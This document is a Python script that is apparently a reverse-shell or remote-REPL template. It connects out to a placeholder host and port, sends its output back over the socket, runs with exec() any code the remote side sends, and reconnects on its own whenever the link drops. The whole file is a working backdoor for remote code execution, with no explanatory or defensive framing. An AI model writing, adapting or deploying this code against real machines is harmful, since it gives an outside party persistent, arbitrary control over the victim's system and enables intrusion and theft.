import sys
import socket
import select
import io
import traceback
import time
class SocketWriter(io.IOBase):
    def __init__(self, sock):
        self.sock = sock
    def write(self, data):
        if data:
            try:
                self.sock.sendall(data.encode("utf-8", "replace"))
            except:
                pass
        return len(data)
    def flush(self):
        pass

def connect_socket(host, port, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)
    r = s.connect_ex((host, port))
    if r not in (0, 10035):
        return None
    
    start_time = time.time()
    while True:
        _, w, _ = select.select([], [s], [], 0.05)
        if s in w:
            e = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
            if e != 0:
                s.close()
                return None
            return s
        if time.time() - start_time > timeout:
            s.close()
            return None
def run_repl(host, port):
    partial_code = []
    
    while True:
        try:
            print(f"[*] Attempting to connect to {host}:{port}...")
            s = connect_socket(host, port)
            s.setblocking(False)
            
            if not s:
                print(f"[-] Connection failed. Retrying in 5 seconds...")
                time.sleep(5)
                continue

            print(f"[+] Connected to {host}:{port}")
            
            w = SocketWriter(s)
            sys.stdout = w
            sys.stderr = w

            print("[+] RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRREPL")

            buf = b""
            running = True

            while running:
                try:
                    rs, _, _ = select.select([s], [], [], 0.05)
                    if s in rs:
                        data = s.recv(4096)
                        if not data:  # Connection closed by peer
                            raise ConnectionError("Connection closed by peer")
                        
                        buf += data
                        while b"\n" in buf:
                            line, _, buf = buf.partition(b"\n")
                            cmd = line.decode("utf-8", "replace")
                            if not cmd and partial_code:
                                code_block = "\n".join(partial_code)
                                partial_code = []
                                try:
                                    compiled = compile(code_block, "<repl>", "exec")
                                    exec(compiled, globals(), globals())
                                    print("[+] Executed block.")
                                except Exception as e:
                                    err = traceback.format_exc()
                                    print(err)
                            elif cmd == "exit":
                                print("[-] Exiting.")
                                running = False
                                sys.exit(0)
                            else:
                                partial_code.append(cmd)

                except (ConnectionError, socket.error) as e:
                    print(f"[-] Connection lost: {str(e)}")
                    break
                
        except KeyboardInterrupt:
            print("\n[-] Interrupted by user. Exiting.")
            sys.exit(0)
        except Exception as e:
            print(f"[-] Unexpected error: {str(e)}")
        
        try:
            s.close()
        except:
            pass
        
        print(f"[-] Reconnecting in 5 seconds...")
        time.sleep(5)

run_repl("__HOST__", __PORT__)